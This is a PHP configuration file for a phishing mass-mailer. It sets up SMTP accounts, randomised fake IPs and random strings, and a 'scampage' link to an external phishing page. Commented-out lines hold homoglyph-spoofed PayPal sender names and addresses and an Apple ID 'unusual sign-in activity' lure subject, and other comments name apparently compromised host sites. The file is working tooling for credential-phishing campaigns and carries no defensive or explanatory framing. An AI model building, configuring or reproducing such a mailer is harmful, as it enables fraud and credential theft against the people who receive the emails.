<?php
date_default_timezone_set('America/New_York');
$date = date('F d, Y, h:i A T');

$randip       = "" . rand(1, 200) . "." . rand(1, 200) . "." . rand(1, 100) . "." . rand(1, 300) . "";
/*function nomer($randstr)
{
    $char = '0123456789';
    $str  = '';
    for ($i = 0;
        $i < $randstr;
        $i++) {
        $pos = rand(0, strlen($char) - 1);
        $str .= $char{$pos};
    }
    return $str;

};
function cok($randstr){
    $char = '1234567890';
    $str  = '';
    for ($i = 0;$i < $randstr;$i++) {
        $pos = rand(0, strlen($char) - 1);
        $str .= $char{$pos};
    }
    return $str;
} */

function cok($length){
  $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  return substr (str_shuffle ($chars),0,$length);
}
function nomer($length){
  $chars = '0123456789';
  return substr (str_shuffle ($chars),0,$length);
}

/* Features SETUP */
$smtp_acc = [
    [
        "host"     => "",
        "port"     => "",
        "username" => "",
        "password" => ""
    ] 
    
];

//print "mеmbeг".cok(1)."".nomer(2)."".RandString(1)."@ρауρаl.сοm";
$gx_setup = [
    "priority"       => 0,
    "userandom"      => 0,
    "sleeptime"      => 3,
    "replacement"    => 1,
    "filesend"       => 1,
    "userremoveline" => 0,
    "mail_list"      => "",
    "fromname"       => "",
    "frommail"       => "support@yourdomain.com",
  //  "subject"        => "Re: Unuѕual sіgn-in actіvіty wіth yоur Αpρle ID ###randstring##".RandString(8)."",
    "subject"        => "Bapakkau config2 #".nomer(5)."",
    "msgfile"        => "file/letter/bcc.txt",
    //"filepdf"        => "file/attachment/apple.html",
    "scampage"       => ["https://webophil.net/images/register.php?id=".RandString(50).""],
    ];
//http://karykaty.com.br/a.php?##email##=".RandString(23)."
//crechemundodossonhos.com.br

$fname = array(
	'config2 pecah'
);
  //  'ΡауΡаl Rесονегу',
//    'Rесονегу ΡауΡаl',